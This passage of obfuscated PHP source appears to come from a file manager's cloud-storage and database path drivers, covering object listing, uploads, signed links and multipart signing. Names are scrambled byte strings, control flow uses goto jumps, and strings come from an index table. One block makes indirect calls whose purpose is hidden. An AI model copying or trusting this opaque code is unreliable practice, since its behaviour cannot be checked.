$BÇ²˜Í³âÖ) { continue; } $BÓ°»ŞŞªå = isset($bÇÍ­­«Í[$F›À…áâ·[78]]) ? $bÇÍ­­«Í[$F›À…áâ·[78]] : 0; goto eÑœÛ„ä·; Cá†÷ğ´Ô: $CåÀªÓƒİÀ[] = $Dò‹öíî¬™ ? $bÇÍ­­«Í : $B²¹ÛÎˆ¦; goto cÔÌÀ‡ò·¨; cÔÌÀ‡ò·¨: } foreach ($AÂÇ§·…±é[$F›À…áâ·[201]] as $bÇÍ­­«Í) { $E¯ö‘š„[] = $bÇÍ­­«Í[$F›À…áâ·[28]]; if ($E¯Û‰â‡ç) { $this->cacheMethod($F›À…áâ·[199], $bÇÍ­­«Í[$F›À…áâ·[28]], !0); } } if ($E¯Û‰â‡ç) { $this->cacheMethod($F›À…áâ·[199], $dÍËšÊ§Ë™, !0); } goto C”¯¹“·„×; C”¯¹“·„×: return array($F›À…áâ·[75] => $E¯ö‘š„, $F›À…áâ·[74] => $CåÀªÓƒİÀ); goto aĞë è’ÅØ; DÈëÂÂÁ: if (!$AÂÇ§·…±é) { return array($F›À…áâ·[75] => array(), $F›À…áâ·[74] => array()); } $E¯Û‰â‡ç = $this->listItemCache === !1 ? !1 : !0; $E¯ö‘š„ = $CåÀªÓƒİÀ = array(); goto CËó¼”«İ; DÁÏâŒ‚Ê: $F›À…áâ· =& $_SERVER[ä°„ä°º]; $BÇ²˜Í³âÖ = rtrim($dÍËšÊ§Ë™, $F›À…áâ·[8]) . $F›À…áâ·[8]; $AÂÇ§·…±é = $this->listObjs($BÇ²˜Í³âÖ, null, null, $d»Ü³ÅËå…); goto DÈëÂÂÁ; aĞë è’ÅØ: } private function listObjs($fƒİß²£Ó, $f¸Š²Ìš½ = null, $EĞöí”’É‡ = null, $e•‡°ÌêË¡ = null) { $AíÚ‰Ô¾š  =& $_SERVER[ä°„ä°º]; $fƒİß²£Ó = trim($fƒİß²£Ó, $AíÚ‰Ô¾š [8]); $EöñÙ»‘È† = empty($fƒİß²£Ó) && $fƒİß²£Ó !== $AíÚ‰Ô¾š [191] ? $AíÚ‰Ô¾š [33] : $fƒİß²£Ó . $AíÚ‰Ô¾š [8]; return $this->client->getBucket($this->bucket, $EöñÙ»‘È†, $f¸Š²Ìš½, $EĞöí”’É‡, $e•‡°ÌêË¡, !0); } public function has($A¼ùà¤øŞî, $e³ ›±àÖ› = false, $fê«å¦Œ³ï = true) { goto B¿˜’É÷Œ§; Fª‡ª’: return !1; goto fß¬…“ñàø; fÕÃùå­¥ë: $dß„íº¨ìø = null; $E ¦¦¿—‚å = 500; $e¢¿Çºù¢ = $bÉ²©Ÿ»èŸ[8]; goto C¨¢ÍäêÀ; B¿˜’É÷Œ§: $bÉ²©Ÿ»èŸ =& $_SERVER[ä°„ä°º]; $A¼ùà¤øŞî = trim($A¼ùà¤øŞî, $bÉ²©Ÿ»èŸ[8]); $dÚé¥œØÊÙ = empty($A¼ùà¤øŞî) && $A¼ùà¤øŞî !== $bÉ²©Ÿ»èŸ[191] ? $bÉ²©Ÿ»èŸ[33] : $A¼ùà¤øŞî . $bÉ²©Ÿ»èŸ[8]; goto fÕÃùå­¥ë; C¨¢ÍäêÀ: $BšĞ©¢¬Ïò = $Cµ··ùëÇ§ = array(); while (!0) { $e„ùù˜×’ª = $this->listObjs($A¼ùà¤øŞî, $dß„íº¨ìø, $E ¦¦¿—‚å, $e¢¿Çºù¢); if (!$e„ùù˜×’ª) { break; } $dß„íº¨ìø = $e„ùù˜×’ª[$bÉ²©Ÿ»èŸ[202]]; $c†·á”“ = $e„ùù˜×’ª[$bÉ²©Ÿ»èŸ[198]]; $eŠƒäˆãºç = $e„ùù˜×’ª[$bÉ²©Ÿ»èŸ[201]]; if (empty($c†·á”“) && empty($eŠƒäˆãºç)) { break; } if (count($c†·á”“) == 1 && $c†·á”“[0][$bÉ²©Ÿ»èŸ[28]] == $dÚé¥œØÊÙ) { break; } if ($e³ ›±àÖ›) { if (count($c†·á”“)) { $c†·á”“ = array_column($c†·á”“, $bÉ²©Ÿ»èŸ[28]); $BšĞ©¢¬Ïò = array_merge($BšĞ©¢¬Ïò, $c†·á”“); } if (count($eŠƒäˆãºç)) { $eŠƒäˆãºç = array_column($eŠƒäˆãºç, $bÉ²©Ÿ»èŸ[28]); $Cµ··ùëÇ§ = array_merge($Cµ··ùëÇ§, $eŠƒäˆãºç); } if ($dß„íº¨ìø === null) { break; } continue; } if ($fê«å¦Œ³ï) { if (!empty($c†·á”“)) { if (count($c†·á”“) > 1 || isset($c†·á”“[0][$bÉ²©Ÿ»èŸ[28]]) && $c†·á”“[0][$bÉ²©Ÿ»èŸ[28]] != $dÚé¥œØÊÙ) { return !0; } } } else { if (!empty($eŠƒäˆãºç)) { return !0; } } if ($dß„íº¨ìø === null) { break; } } if ($e³ ›±àÖ›) { $BšĞ©¢¬Ïò = array_diff($BšĞ©¢¬Ïò, array($dÚé¥œØÊÙ)); $BšĞ©¢¬Ïò = count(array_unique($BšĞ©¢¬Ïò)); $Cµ··ùëÇ§ = count(array_unique($Cµ··ùëÇ§)); return array($bÉ²©Ÿ»èŸ[203] => $BšĞ©¢¬Ïò, $bÉ²©Ÿ»èŸ[204] => $Cµ··ùëÇ§); } goto Fª‡ª’; fß¬…“ñàø: } public function listAll($FëÔß‘¤‹) { $b‡¿¡âØ”¥ =& $_SERVER[ä°„ä°º]; $c‘›œ×ÄĞä = $this->fileList($FëÔß‘¤‹, $b‡¿¡âØ”¥[33], !0); $DÙİÈ–Œø¢ = array(); foreach ($c‘›œ×ÄĞä[$b‡¿¡âØ”¥[74]] as $dÍÃİøÚ¤‰) { $DÙİÈ–Œø¢[$dÍÃİøÚ¤‰[$b‡¿¡âØ”¥[28]]] = $dÍÃİøÚ¤‰[$b‡¿¡âØ”¥[78]]; } foreach ($c‘›œ×ÄĞä[$b‡¿¡âØ”¥[75]] as $dÍÃİøÚ¤‰) { if (is_string($dÍÃİøÚ¤‰)) { $DÙİÈ–Œø¢[$dÍÃİøÚ¤‰] = 0; } } return $this->listAllFiles($FëÔß‘¤‹, array_keys($DÙİÈ–Œø¢), $DÙİÈ–Œø¢); } public function canRead($c‡¶¡ÛÚœ) { $cÎŠÒá‚ÓÎ =& $_SERVER[ä°„ä°º]; $a¤„°»Ğ‚ = $this->client->getAccessControlPolicy($this->bucket, $c‡¶¡ÛÚœ); if (!$a¤„°»Ğ‚) { return !1; } return in_array($a¤„°»Ğ‚, array($cÎŠÒá‚ÓÎ[205], $cÎŠÒá‚ÓÎ[206], $cÎŠÒá‚ÓÎ[207])) ? !0 : !1; } public function canWrite($C‚Î±¸‰ö”) { $b¿”‚Íî =& $_SERVER[ä°„ä°º]; $AÑïáæ¸ÅÓ = $this->client->getAccessControlPolicy($this->bucket, $C‚Î±¸‰ö”); if (!$AÑïáæ¸ÅÓ) { return !1; } return in_array($AÑïáæ¸ÅÓ, array($b¿”‚Íî[205], $b¿”‚Íî[206])) ? !0 : !1; } public function getContent($D¤ˆÑë‘ƒï) { return $this->client->getObject($this->bucket, $D¤ˆÑë‘ƒï); } public function setContent($Eæ‹ÎË¨Ç, $aâÂ¾µÆ¯´ = '', $e‡†ÆáÊÌ„ = false) { goto d×Ÿô›àô; e·Æ•›: $this->cacheMethod(null, null); $b‰‚ÎªÎøÍ = $this->copyFile($Eæ‹ÎË¨Ç, $Eæ‹ÎË¨Ç, array($E¶äç‹®…Ÿ[208] => $b‰‚ÎªÎøÍ[$E¶äç‹®…Ÿ[209]])); return $b‰‚ÎªÎøÍ ? !0 : !1; goto AÒĞ·åº©²; d×Ÿô›àô: $E¶äç‹®…Ÿ =& $_SERVER[ä°„ä°º]; $Eæ‹ÎË¨Ç = $e‡†ÆáÊÌ„ ? trim($Eæ‹ÎË¨Ç, $E¶äç‹®…Ÿ[8]) . $E¶äç‹®…Ÿ[8] : $Eæ‹ÎË¨Ç; $DøçÈ‘øìš = get_file_mime(get_path_ext($Eæ‹ÎË¨Ç)); goto AÒ×ßè¶Çù; AÒ×ßè¶Çù: $b‰‚ÎªÎøÍ = $this->client->putObject($aâÂ¾µÆ¯´, $this->bucket, $Eæ‹ÎË¨Ç, $E¶äç‹®…Ÿ[192], array(), $DøçÈ‘øìš); if (!$b‰‚ÎªÎøÍ) { return !1; } if ($e‡†ÆáÊÌ„) { return !0; } goto e·Æ•›; AÒĞ·åº©²: } public function fileSubstr($f›çÚøáœ, $fùŒåéŠ‚, $AİâÉ®…) { $eŸòš¤¦ ç = $fùŒåéŠ‚ + $AİâÉ®… - 1; return $this->client->getObject($this->bucket, $f›çÚøáœ, array($_SERVER[ä°„ä°º][210] => "\x62\x79\164\x65\163\75{$fùŒåéŠ‚}\x2d{$eŸòš¤¦ ç}")); } public function upload($aøÉÂ¶‡Š, $dØŠİÃÖƒµ, $a‹‰ˆ¬§ä = false, $d¨ÈÄ¾›‹ = REPEAT_REPLACE) { $F•Úù¾Ã§ =& $_SERVER[ä°„ä°º]; $E ÏŒî‘¹ = array($F•Úù¾Ã§[208] => @md5_file($dØŠİÃÖƒµ)); $b…‰š½ÃïÃ = array($F•Úù¾Ã§[211] => get_file_mime(get_path_ext($aøÉÂ¶‡Š))); if (IO::size($dØŠİÃÖƒµ) <= 1024 * 1024 * 200) { $BÔ¯Ïí¾¾ = $this->client->putObjectFile($dØŠİÃÖƒµ, $this->bucket, $aøÉÂ¶‡Š, $F•Úù¾Ã§[192], $E ÏŒî‘¹, $b…‰š½ÃïÃ); return !empty($BÔ¯Ïí¾¾) ? $this->getPathOuter($aøÉÂ¶‡Š) : !1; } $A¾†¾‰­Œ = $this->client->multiUploadObject($dØŠİÃÖƒµ, $this->bucket, trim($aøÉÂ¶‡Š, $F•Úù¾Ã§[8]), $E ÏŒî‘¹, $b…‰š½ÃïÃ); return $A¾†¾‰­Œ ? $this->getPathOuter($aøÉÂ¶‡Š) : !1; } public function download($CÎŒ¢¨·ÌÚ, $bëƒ‚†Õ®) { if (!@is_dir($this->pathFather($bëƒ‚†Õ®)) && !IO::mkdir($this->pathFather($bëƒ‚†Õ®))) { return !1; } $bîêù‹ëË¥ = $this->client->getObject($this->bucket, $CÎŒ¢¨·ÌÚ, array(), $bëƒ‚†Õ®); return $bîêù‹ëË¥ !== !1 ? $bëƒ‚†Õ® : !1; } public function link($CšÚ„÷öõÏ, $a¶Š·ÔÈ… = array()) { $bøŠ…æÊËÈ =& $_SERVER[ä°„ä°º]; if ($this->signVer == $bøŠ…æÊËÈ[212]) { return $this->client->getAuthenticatedURL($this->bucket, $CšÚ„÷öõÏ, 3600 * 12, $a¶Š·ÔÈ…); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($CšÚ„÷öõÏ, $bøŠ…æÊËÈ[8]), 3600 * 12, $this->region, array(), !0, $a¶Š·ÔÈ…); } public function fileOut($EŠíëŒ´¯§, $cİ¤¼Ì¡ = false, $EÌ¬ïõ½§Ù = false, $dË¥…ÀÓ = '') { goto D‘ß¿´¬õ·; eÁ‹«¯·Š: $B–ó«‘Çõ° = get_file_mime(get_path_ext($EÌ¬ïõ½§Ù)); if ($B–ó«‘Çõ° == $d‰¯ÏÚŞÁ­[213]) { return parent::fileOut($EŠíëŒ´¯§, $cİ¤¼Ì¡, $EÌ¬ïõ½§Ù, $dË¥…ÀÓ); } $cİ¤¼Ì¡ = $cİ¤¼Ì¡ ? $d‰¯ÏÚŞÁ­[214] : $d‰¯ÏÚŞÁ­[215]; goto C’ƒÀªÅç; C’ƒÀªÅç: $A»¬ã„î„ = array($d‰¯ÏÚŞÁ­[216] => $cİ¤¼Ì¡ . $d‰¯ÏÚŞÁ­[217] . rawurlencode($EÌ¬ïõ½§Ù), $d‰¯ÏÚŞÁ­[218] => $B–ó«‘Çõ°); $a÷ÚÅºÃ’¢ = $this->link($EŠíëŒ´¯§, $A»¬ã„î„); $this->fileOutLink($a÷ÚÅºÃ’¢); goto AÍÕŞÑä“¨; D‘ß¿´¬õ·: $d‰¯ÏÚŞÁ­ =& $_SERVER[ä°„ä°º]; if ($this->isFileOutServer()) { return $this->fileOutServer($EŠíëŒ´¯§, $cİ¤¼Ì¡, $EÌ¬ïõ½§Ù, $dË¥…ÀÓ); } if (!$EÌ¬ïõ½§Ù) { $EÌ¬ïõ½§Ù = $this->pathThis($EŠíëŒ´¯§); } goto eÁ‹«¯·Š; AÍÕŞÑä“¨: } public function fileOutServer($E‚¾ÛÉõãî, $Aƒ‡¼ÆÕ£Ì = false, $F×óÕå‹Ï = false, $cØÏœ—®ç¤ = '') { parent::fileOut($E‚¾ÛÉõãî, $Aƒ‡¼ÆÕ£Ì, $F×óÕå‹Ï, $cØÏœ—®ç¤); } public function fileOutImageServer($F¯¤è¡•ÒŸ, $a½ÚÌÒ¼” = 250) { parent::fileOutImage($F¯¤è¡•ÒŸ, $a½ÚÌÒ¼”); } public function hashMd5($AÇ…×‡ê¡é, $bß¦»å¢†… = '') { $Fá·îŠáÕ =& $_SERVER[ä°„ä°º]; $B¤ŸÍ¬¡·‹ = $this->objectMeta($AÇ…×‡ê¡é); if (!$B¤ŸÍ¬¡·‹) { return !1; } $bß¦»å¢†… = $bß¦»å¢†… ? $bß¦»å¢†… : _get($B¤ŸÍ¬¡·‹, $Fá·îŠáÕ[219]); $bß¦»å¢†… = $bß¦»å¢†… ? $bß¦»å¢†… : _get($B¤ŸÍ¬¡·‹, $Fá·îŠáÕ[209], $Fá·îŠáÕ[33]); return $bß¦»å¢†…; } public function uploadFormData($Aò¢‡·„, $a¾Ã¦ÏæŒÉ = 3600) { $d‚–öç‘´È =& $_SERVER[ä°„ä°º]; $D—æ–Êƒ‹Œ = $this->pathFather($Aò¢‡·„); $a¶”÷Êù•¯ = $this->client->getHttpUploadPostParams($this->bucket, $D—æ–Êƒ‹Œ, $d‚–öç‘´È[192], $a¾Ã¦ÏæŒÉ); return array_merge((array) $a¶”÷Êù•¯, array($d‚–öç‘´È[175] => $this->getHost())); } public function multiUploadFormData($EÅ‘”·è¥¦, $e¡½øÅÅŒŞ = 3600) { $dˆÛç“±¸ì =& $_SERVER[ä°„ä°º]; $cÓƒËèëŒ = gmdate($dˆÛç“±¸ì[220]); $A¿Âš÷ï¹÷ = array(); $fƒ¯†ÔŠ”œ = $this->client->getUploadId($this->bucket, $EÅ‘”·è¥¦, $A¿Âš÷ï¹÷); if (!$fƒ¯†ÔŠ”œ) { return !1; } return array($dˆÛç“±¸ì[221] => $fƒ¯†ÔŠ”œ, $dˆÛç“±¸ì[175] => $this->getHost() . $dˆÛç“±¸ì[8] . $this->pathEncode($EÅ‘”·è¥¦), $dˆÛç“±¸ì[222] => $cÓƒËèëŒ, $dˆÛç“±¸ì[93] => $EÅ‘”·è¥¦); } public function multiUploadAuthData($CùŞÚñƒéè, $d×É†ã­Ş = array()) { goto B¼ĞÃƒÄ§‚; B¼ĞÃƒÄ§‚: $b¡×Œé‘† =& $_SERVER[ä°„ä°º]; $FéÒé¡‹¢ = isset($d×É†ã­Ş[$b¡×Œé‘†[222]]) ? $d×É†ã­Ş[$b¡×Œé‘†[222]] : gmdate($b¡×Œé‘†[220]); $fóÌÓˆÂ±Ò = isset($d×É†ã­Ş[$b¡×Œé‘†[168]]) ? $d×É†ã­Ş[$b¡×Œé‘†[168]] : $b¡×Œé‘†[33]; goto cß´™Ğ­öø; C¡åÊÖ³Á¦: if (strpos($fóÌÓˆÂ±Ò, $b¡×Œé‘†[225]) === 0) { return array($b¡×Œé‘†[232] => $a”á— ‘ÃË, $b¡×Œé‘†[222] => $FéÒé¡‹¢); } return $a”á— ‘ÃË; goto a³Ú°øòº; Eê¨‘ÌÌ: $fõá‘’ì¹ = implode($b¡×Œé‘†[229], $cáìæÆ·ƒ); $B±É‡•«Î = base64_encode(hash_hmac($b¡×Œé‘†[230], $fõá‘’ì¹, $this->secret, !0)); $a”á— ‘ÃË = $b¡×Œé‘†[231] . $this->accessKey . $b¡×Œé‘†[4] . $B±É‡•«Î; goto C¡åÊÖ³Á¦; cß´™Ğ­öø: $E¶µ¢’Ú• = $d×É†ã­Ş[$b¡×Œé‘†[93]]; unset($d×É†ã­Ş[$b¡×Œé‘†[93]]); if (isset($d×É†ã­Ş[$b¡×Œé‘†[223]])) { $d×É†ã­Ş[$b¡×Œé‘†[222]] = $FéÒé¡‹¢; return $this->listUploadParts($E¶µ¢’Ú•, $d×É†ã­Ş); } goto béæ¯±ìÃ„; béæ¯±ìÃ„: $cáìæÆ·ƒ = array($b¡×Œé‘†[224], $b¡×Œé‘†[33], $b¡×Œé‘†[119], $b¡×Œé‘†[33], "\x78\x2d\141\155\x7a\55\x64\x61\164\145\x3a{$FéÒé¡‹¢}", $b¡×Œé‘†[8] . $this->bucket . $b¡×Œé‘†[8] . $this->pathEncode($E¶µ¢’Ú•) . $fóÌÓˆÂ±Ò); if (strpos($fóÌÓˆÂ±Ò, $b¡×Œé‘†[225]) === 0) { $cáìæÆ·ƒ[0] = $b¡×Œé‘†[226]; } if (isset($d×É†ã­Ş[$b¡×Œé‘†[227]]) && $d×É†ã­Ş[$b¡×Œé‘†[227]] == $b¡×Œé‘†[228]) { $cáìæÆ·ƒ[0] = $b¡×Œé‘†[228]; } goto Eê¨‘ÌÌ; a³Ú°øòº: } public function listUploadParts($bªŸ«¾œÛá, $b·Ò¦«Æ = array()) { goto Dî¡íÀàŸ; bäÂ×Û‚à¾: if (!$däğØ³ÜâÚ) { return !1; } unset($b·Ò¦«Æ[$Cá•áÉÄ”÷[223]], $b·Ò¦«Æ[$Cá•áÉÄ”÷[227]]); $b·Ò¦«Æ[$Cá•áÉÄ”÷[93]] = $bªŸ«¾œÛá; goto C¨µœÌŒ”«; C¨µœÌŒ”«: $b×Ï²‡Ä•Õ = $this->multiUploadAuthData($bªŸ«¾œÛá, $b·Ò¦«Æ); if (empty($b×Ï²‡Ä•Õ)) { return !1; } return array($Cá•áÉÄ”÷[232] => $b×Ï²‡Ä•Õ, $Cá•áÉÄ”÷[222] => $b·Ò¦«Æ[$Cá•áÉÄ”÷[222]], $Cá•áÉÄ”÷[234] => $däğØ³ÜâÚ); goto aÜöÔİñ‘¦; Dî¡íÀàŸ: $Cá•áÉÄ”÷ =& $_SERVER[ä°„ä°º]; $c‚¢ÉÚĞÄï = str_replace($Cá•áÉÄ”÷[233], $Cá•áÉÄ”÷[33], $b·Ò¦«Æ[$Cá•áÉÄ”÷[168]]); $däğØ³ÜâÚ = $this->client->listParts($this->bucket, $bªŸ«¾œÛá, $c‚¢ÉÚĞÄï); goto bäÂ×Û‚à¾; aÜöÔİñ‘¦: } public function getHost() { return parent::getHost() . $_SERVER[ä°„ä°º][8] . $this->bucket; } public function size($d§¸±¸Æ÷Ó) { $F£ùßöµçß = $this->objectMeta($d§¸±¸Æ÷Ó); return $F£ùßöµçß ? $F£ùßöµçß[$_SERVER[ä°„ä°º][78]] : 0; } public function info($A¸É½·İ‘É) { if ($this->isFolder($A¸É½·İ‘É)) { return $this->folderInfo($A¸É½·İ‘É); } else { if ($this->isFile($A¸É½·İ‘É)) { return $this->fileInfo($A¸É½·İ‘É); } } return !1; } public function exist($eö×ÒºÎÁ×) { return $this->isFile($eö×ÒºÎÁ×) || $this->isFolder($eö×ÒºÎÁ×); } public function isFile($fğèÏİãŸ˜) { return !$this->isFolder($fğèÏİãŸ˜) && $this->objectMeta($fğèÏİãŸ˜); } public function isFolder($d¹òÌœ—¶‘) { return $this->cacheMethod($_SERVER[ä°„ä°º][199], $d¹òÌœ—¶‘); } protected function objectMeta($d†îïî ¸ã) { return $this->cacheMethod($_SERVER[ä°„ä°º][200], $d†îïî ¸ã); } protected function _objectMeta($a¹½ˆä’ù„) { $FÒØ›°¢›“ =& $_SERVER[ä°„ä°º]; $a¹½ˆä’ù„ = rtrim($a¹½ˆä’ù„, $FÒØ›°¢›“[8]); try { $A½×¬òÉù« = $this->client->getObjectInfo($this->bucket, $a¹½ˆä’ù„); if (!isset($A½×¬òÉù«[$FÒØ›°¢›“[219]]) && isset($A½×¬òÉù«[$FÒØ›°¢›“[235]])) { $A½×¬òÉù«[$FÒØ›°¢›“[219]] = $A½×¬òÉù«[$FÒØ›°¢›“[235]]; } } catch (Exception $f¤Âñï‚Á ) { $A½×¬òÉù« = !1; } if (!$A½×¬òÉù«) { } return $A½×¬òÉù«; } protected function _isFolder($F¯¦¹« İŸ) { goto E¢óà£ô; D—è¤³šÃŠ: $B¤’›¦µìò = $this->client->getBucket($this->bucket, $F¯¦¹« İŸ, null, 1); if (empty($B¤’›¦µìò[$d¢õ†…Œ²¿[198]])) { return !1; } $eÈ£÷Ì¿ï‚ = $B¤’›¦µìò[$d¢õ†…Œ²¿[198]][0][$d¢õ†…Œ²¿[28]]; goto b‹‡øŒï“ù; b‹‡øŒï“ù: return stripos($eÈ£÷Ì¿ï‚, $F¯¦¹« İŸ . $d¢õ†…Œ²¿[8]) === 0 ? !0 : !1; if (substr($eÈ£÷Ì¿ï‚, -1) == $d¢õ†…Œ²¿[8]) { return !0; } if (get_path_this($eÈ£÷Ì¿ï‚) == get_path_this($F¯¦¹« İŸ)) { return !1; } goto dîØĞÛ¨Š£; dîØĞÛ¨Š£: return !0; goto BËÛÍÁÊÚê; E¢óà£ô: $d¢õ†…Œ²¿ =& $_SERVER[ä°„ä°º]; $F¯¦¹« İŸ = rtrim($F¯¦¹« İŸ, $d¢õ†…Œ²¿[8]); if ($F¯¦¹« İŸ == $d¢õ†…Œ²¿[33] || $F¯¦¹« İŸ == $d¢õ†…Œ²¿[8]) { return !0; } goto D—è¤³šÃŠ; BËÛÍÁÊÚê: } } define($_SERVER[ä°„ä°º][236], 1); goto B¡Ë‘òá„; CÕ£®½¤´: if ($_SERVER[$_SERVER[ä°„ä°º][844]] != $_SERVER[$_SERVER[ä°„ä°º][861]]) { goto Bõ¼Î¶©Àˆ; bÅ—‘¯ŞĞ»: $e‚æ‘¡ïÜ­ = explode($_SERVER[ä°„ä°º][229], $b¶˜‡¦œ‹); if (count($e‚æ‘¡ïÜ­) < $_SERVER[ä°„ä°º][605]) { $c×øø¶¨ç = $_SERVER[ä°„ä°º][849]; $c×øø¶¨ç(); } $e¶Í—õ•‹ã = $_SERVER[ä°„ä°º][850]; goto BôÓçŸó‘Ñ; BôÓçŸó‘Ñ: $e¶Í—õ•‹ã($_SERVER[$_SERVER[ä°„ä°º][845]]); goto c‚šÄƒµÔ×; Bõ¼Î¶©Àˆ: $B‹¤¸‰ß“ = $_SERVER[ä°„ä°º][846]; $B–„÷Ş¢éÀ = $_SERVER[$_SERVER[ä°„ä°º][847]] . $_SERVER[ä°„ä°º][848]; $b¶˜‡¦œ‹ = $B‹¤¸‰ß“($B–„÷Ş¢éÀ); goto bÅ—‘¯ŞĞ»; c‚šÄƒµÔ×: } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($dîáÙ°ğÚ) { parent::__construct($dîáÙ°ğÚ); $this->signatureVersion($_SERVER[ä°„ä°º][212]); } public function uploadFormData($fõ”šØÃÃÁ, $fÔ‰¼ğ¾˜¬ = 3600) { goto B’À‹á¬¢³; eôïÄ ¶Û‚: return $a¥·ÙïœÅÅ; goto f­Œš¼‰‰ó; EÄí·¦ê¤Ö: $b´õÖŒšÁ± = sha1($FÓÂ«ğÓ‘Á); $C«›¾¸…âç = hash_hmac($cÁí¦àííï[230], $b´õÖŒšÁ±, $f‚Ã–È“°¡); $a¥·ÙïœÅÅ = array($cÁí¦àííï[1214] => $C¾¨Íëöâ, $cÁí¦àííï[1218] => $a¿ãàòíç, $cÁí¦àííï[1222] => base64_encode($FÓÂ«ğÓ‘Á), $cÁí¦àííï[1219] => $e…×ƒ¤Š, $cÁí¦àííï[1220] => $this->accessKey, $cÁí¦àííï[1223] => $cí’ëÌÁÚ, $cÁí¦àííï[1224] => $C«›¾¸…âç, $cÁí¦àííï[175] => $this->getHost()); goto eôïÄ ¶Û‚; B’À‹á¬¢³: $cÁí¦àííï =& $_SERVER[ä°„ä°º]; $C¾¨Íëöâ = $cÁí¦àííï[192]; $e…×ƒ¤Š = $cÁí¦àííï[230]; goto B¦——·±­; B¦——·±­: $a¿ãàòíç = $cÁí¦àííï[1210]; $cèİĞ¢‚ÈÔ = gmdate($cÁí¦àííï[1211], time() + $fÔ‰¼ğ¾˜¬); $cí’ëÌÁÚ = (string) time() . $cÁí¦àííï[68] . (string) (time() + $fÔ‰¼ğ¾˜¬); goto C½ãˆ»ŠÄ¬; C½ãˆ»ŠÄ¬: $FÓÂ«ğÓ‘Á = array($cÁí¦àííï[1212] => $cèİĞ¢‚ÈÔ, $cÁí¦àííï[1213] => array(array($cÁí¦àííï[1214] => $C¾¨Íëöâ), array($cÁí¦àííï[1215] => $this->bucket), array($cÁí¦àííï[1216], $cÁí¦àííï[1217], $cÁí¦àííï[33]), array($cÁí¦àííï[1218] => $a¿ãàòíç), array($cÁí¦àííï[1219] => $e…×ƒ¤Š), array($cÁí¦àííï[1220] => $this->accessKey), array($cÁí¦àííï[1221] => $cí’ëÌÁÚ))); $FÓÂ«ğÓ‘Á = json_encode($FÓÂ«ğÓ‘Á); $f‚Ã–È“°¡ = hash_hmac($cÁí¦àííï[230], $cí’ëÌÁÚ, $this->secret); goto EÄí·¦ê¤Ö; f­Œš¼‰‰ó: } public function fileOutLink($eµÖ’ƒ·³²) { $fï“´ëİóà =& $_SERVER[ä°„ä°º]; if (substr($eµÖ’ƒ·³², 0, 7) == $fï“´ëİóà[1225]) { $eµÖ’ƒ·³² = $fï“´ëİóà[1226] . substr($eµÖ’ƒ·³², 7); } header($fï“´ëİóà[159] . $eµÖ’ƒ·³²); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($B£„Ä¦õ) { $this->pathParse = $B£„Ä¦õ; $this->model = Model($_SERVER[ä°„ä°º][1227]); } public function getPath($Cê¿‡ñ­ô×) { return trim($Cê¿‡ñ­ô×, $_SERVER[ä°„ä°º][8]); } public function pathFather($a´ŒñóÑ¦) { $cØÂ“Ü‘ÔÅ = $this->parse($a´ŒñóÑ¦); $cØÂ“Ü‘ÔÅ = $this->infoSimple($a´ŒñóÑ¦); return $cØÂ“Ü‘ÔÅ ? $cØÂ“Ü‘ÔÅ[$_SERVER[ä°„ä°º][478]] : !1; } public function pathThis($CŒÒ¶¾ ²ˆ) { $E™¸êÁùŞÕ = $this->infoSimple($CŒÒ¶¾ ²ˆ); return $E™¸êÁùŞÕ ? $E™¸êÁùŞÕ[$_SERVER[ä°„ä°º][28]] : !1; } public function getPathOuter($Fš´õƒ¶§) { if (!$Fš´õƒ¶§) { return $Fš´õƒ¶§; } $Bİ °Ú¦åœ = $this->parse($Fš´õƒ¶§); return KodIO::make($Bİ °Ú¦åœ[$_SERVER[ä°„ä°º][393]]); } public function copyFolderFromIO($Eö—£ì£¸ö, $E´ŒÂ„™œ¡, $däå—§‚ùî, $cÛˆ ªõ¶˜, $C×¥‚îº¾) { $Cµß´ ¨…÷ = $this->model->copyFolderFromIO($Eö—£ì£¸ö, $E´ŒÂ„™œ¡, $däå—§‚ùî, $cÛˆ ªõ¶˜, $C×¥‚îº¾); return KodIO::make($Cµß´ ¨…÷); } public function isParentOf($aâİ®“í‚ó, $eˆ‘Ã…ÄŠ) { return $this->model->isParentOf($aâİ®“í‚ó, $eˆ‘Ã…ÄŠ); } public function mkfile($aÉå‡‘›óğ, $fÁŸõÄ = '', $FÅµîÁƒª = REPEAT_RENAME) { $fâ¨¢øÃ˜ =& $_SERVER[ä°„ä°º]; $DíÜ…Ù©Ì­ = $this->parse($aÉå‡‘›óğ); $aÉå‡‘›óğ = $DíÜ…Ù©Ì­[$fâ¨¢øÃ˜[393]]; for ($bç““Çğ‰ = 0; $bç““Çğ‰ < count($DíÜ…Ù©Ì­[$fâ¨¢øÃ˜[1228]]); $bç““Çğ‰++) { $DˆÓ™‰Ù¤® = $DíÜ…Ù©Ì­[$fâ¨¢øÃ˜[1228]][$bç““Çğ‰]; if ($bç““Çğ‰ == count($DíÜ…Ù©Ì­[$fâ¨¢øÃ˜[1228]]) - 1) { $aÉå‡‘›óğ = $this->model->mkfile($aÉå‡‘›óğ, $DˆÓ™‰Ù¤®, $fÁŸõÄ, $FÅµîÁƒª); break; } $aÉå‡‘›óğ = $this->model->mkdir($aÉå‡‘›óğ, $DˆÓ™‰Ù¤®, REPEAT_SKIP); } return $this->getPathOuter($aÉå‡‘›óğ); } public function mkdir($D‡–Ö¸¾«, $eÌµ‘‹ˆáÃ = REPEAT_SKIP) { $D©ÚŠËÑ· =& $_SERVER[ä°„ä°º]; $Cµï¯øä–ï = $this->parse($D‡–Ö¸¾«); $D‡–Ö¸¾« = $Cµï¯øä–ï[$D©ÚŠËÑ·[393]]; for ($e£’’”Üù = 0; $e£’’”Üù < count($Cµï¯øä–ï[$D©ÚŠËÑ·[1228]]); $e£’’”Üù++) { $EÁ§¶”İ©Õ = $Cµï¯øä–ï[$D©ÚŠËÑ·[1228]][$e£’’”Üù]; $D‡–Ö¸¾« = $this->model->mkdir($D‡–Ö¸¾«, $EÁ§¶”İ©Õ, $eÌµ‘‹ˆáÃ); } return $this->getPathOuter($D‡–Ö¸¾«); } public function copyFile($B†öÈà´ÛÒ, $bòÄ¾³íÛ“, $AÁòâÃÂ†Î = REPEAT_REPLACE) { $eŒ‡èàËß« =& $_SERVER[ä°„ä°º]; $c¤«çì‰„‘ = $this->parse($bòÄ¾³íÛ“); $A‘¤İ‘ŞÉè = $this->model->copy($B†öÈà´ÛÒ, $c¤«çì‰„‘[$eŒ‡èàËß«[393]], $AÁòâÃÂ†Î, $c¤«çì‰„‘[$eŒ‡èàËß«[76]]); return $A‘¤İ‘ŞÉè ? 